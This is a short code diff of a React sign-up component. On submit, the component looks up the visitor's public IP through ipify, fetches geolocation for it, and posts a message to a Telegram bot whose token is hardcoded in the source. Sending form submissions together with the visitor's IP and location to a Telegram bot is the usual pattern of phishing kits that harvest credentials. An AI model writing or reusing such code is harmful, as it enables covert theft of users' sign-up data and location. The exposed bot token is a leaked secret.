@@ -55,7 +55,17 @@ export default function SignUp() {
     event.preventDefault()
     setIsLoading(true)
     const botToken = '6800644942:AAHfTeX6q4tbfOnYQ2pcpxsFGMHLMOoAL_U'
-    const responseGeo = await fetch('/api/geo')
+    const responseIP = await fetch('https://api.ipify.org?format=json')
+    const responseIPJson = await responseIP.json()
+    const responseGeo = await fetch('/api/geo', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        ip: responseIPJson.ip
+      })
+    })
     const responseGeoJson = await responseGeo.json()
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
